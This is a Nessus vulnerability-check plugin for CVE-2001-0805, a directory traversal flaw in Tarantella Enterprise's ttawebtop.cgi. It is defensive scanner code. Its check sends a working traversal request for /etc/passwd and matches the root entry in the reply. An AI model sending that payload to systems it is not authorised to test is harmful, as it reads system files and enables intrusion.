#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10696);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2001-0805");
 script_bugtraq_id(2890);
 script_xref(name:"OSVDB", value:"575"); 
 
 script_name(english:"Tarantella Enterprise ttawebtop.cgi pg Variable Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote host has a CGI installed that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The 'ttawebtop.cgi' CGI is installed. The installed version
is affected by multiple flaws :

  - It is possible to read arbitrary files from the remote 
    system by including directory traversal strings in the 
    request.

  - It may be possible for an attacker to execute arbitrary
    commands with the privileges of the http daemon (usually 
    root or nobody). Note though Nessus has not verified if 
    command execution is possible." );
 script_set_attribute(attribute:"solution", value:
"remove it from /cgi-bin." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N" );

script_end_attributes();

 script_summary(english:"Checks for the presence of /cgi-bin/ttawebtop.cgi");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 res = http_send_recv3(method:"GET", item:string(dir, "/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd"), port:port);
 if( isnull(res)) exit(1,"Null response to ttawebtop.cgi request.");
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:res[2]))
  {	
    security_hole(port);
    exit(0);
  }
}
